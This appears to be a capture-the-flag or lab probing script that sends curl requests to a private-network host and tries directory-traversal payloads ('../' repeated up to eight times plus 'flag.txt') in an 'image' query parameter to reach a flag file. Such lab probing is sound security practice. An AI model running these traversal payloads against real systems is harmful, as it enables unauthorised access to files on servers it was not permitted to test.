import json
import urllib.parse

from framework_evidence import run_tool

BASE = "http://192.168.2.6/"

def make_url(value=None):
    if value is None:
        return BASE
    return BASE + "?" + urllib.parse.urlencode({"image": value})

requests = [("root", make_url())]
requests.extend(("exposed_image_value_" + value, make_url(value)) for value in ("1", "2", "3"))
requests.extend(
    ("image_traversal_depth_" + str(depth), make_url("../" * depth + "flag.txt"))
    for depth in range(1, 9)
)

results = []
for label, url in requests:
    argv = ["curl", "--noproxy", "*", "-sS", "-i", "--max-time", "10", url]
    try:
        envelope = run_tool(argv)
        results.append({"label": label, "url": url, "evidence": envelope})
    except Exception as exc:
        results.append({"label": label, "url": url, "command": argv,
                        "execution_error": type(exc).__name__ + ": " + str(exc)})

print(json.dumps({"purpose": "Inspect the observed HTTP root and its exposed image parameter for an application-supported path to /flag.txt.",
                  "requests": results}, ensure_ascii=False))

